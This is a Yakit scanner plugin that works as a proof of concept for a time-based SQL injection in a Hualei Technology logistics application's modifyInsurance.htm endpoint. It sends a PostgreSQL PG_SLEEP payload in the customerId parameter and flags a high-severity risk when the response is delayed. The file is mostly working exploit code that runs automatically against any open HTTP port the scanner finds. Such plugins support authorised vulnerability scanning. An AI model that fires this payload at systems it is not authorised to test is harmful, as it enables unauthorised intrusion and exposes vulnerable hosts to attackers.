# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close

`
	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
	poc.timeout(6),
    )
	resp_time=time.Since(begin_time)

    if int(resp_time) > 5000000000{
        yakit.Info("%v found 华磊科技物流modifyInsurance sql注入漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("华磊科技物流modifyInsurance sql注入漏洞"),
        risk.severity("high"),
        risk.titleVerbose("华磊科技物流modifyInsurance sql注入漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
